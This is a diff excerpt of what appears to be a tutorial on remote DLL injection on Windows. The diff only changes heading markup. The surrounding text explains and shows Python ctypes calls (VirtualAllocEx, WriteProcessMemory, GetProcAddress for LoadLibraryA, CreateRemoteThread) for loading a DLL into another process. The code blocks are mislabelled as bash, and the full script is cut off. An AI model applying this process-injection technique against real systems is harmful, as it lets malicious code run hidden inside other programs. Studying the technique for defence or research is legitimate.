@@ -52,7 +52,7 @@ print("Handle obtained ⇒", hex(handle))
    VirtualAllocEx is used to reserve a block of memory in the target process’s address space.
    The size of the memory allocated is determined by the length of the DLL path string. The allocation is done using the
    flags MEM_COMMIT | MEM_RESERVE, and the memory is initially marked as PAGE_READWRITE so that it can be modified.
-## Code
+###
    ```bash
 remote_memory = VirtualAllocEx(handle, False, len(dll) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
 if not remote_memory:
@@ -64,7 +64,7 @@ print("Memory allocated ⇒", hex(remote_memory))
    Once memory is allocated, the DLL path is written into the remote process using WriteProcessMemory.
    This step places the path (as a string) into the process’s memory space so that it can later be used by the LoadLibraryA
    function.
-## Code
+###
    ```bash
 write = WriteProcessMemory(handle, remote_memory, dll, len(dll) + 1, None)
 if not write:
@@ -77,7 +77,7 @@ print("Bytes written ⇒", dll)
    function.
    Then, GetProcAddress retrieves the address of LoadLibraryA within that module.
    This address will be the entry point for loading the DLL into the remote process.
-## Code
+###
    ```bash
 load_lib = GetProcAddress(GetModuleHandle(b"kernel32.dll"), b"LoadLibraryA")
 print("LoadLibrary address ⇒", hex(load_lib))
@@ -88,13 +88,13 @@ print("LoadLibrary address ⇒", hex(load_lib))
    This function creates a new thread in the target process that begins execution at the LoadLibraryA function, with the
    argument being the address of the DLL path in remote memory.
    When the thread runs, LoadLibraryA loads the DLL, thus completing the injection.
-## Code
+###
    ```bash
 rthread = CreateRemoteThread(handle, None, 0, load_lib, remote_memory, EXECUTE_IMMEDIATELY, None)
    ```
 
 ## Code ~ Remote DLL Injection
-## Code
+###
    ```bash
 from ctypes import *
 from ctypes import wintypes
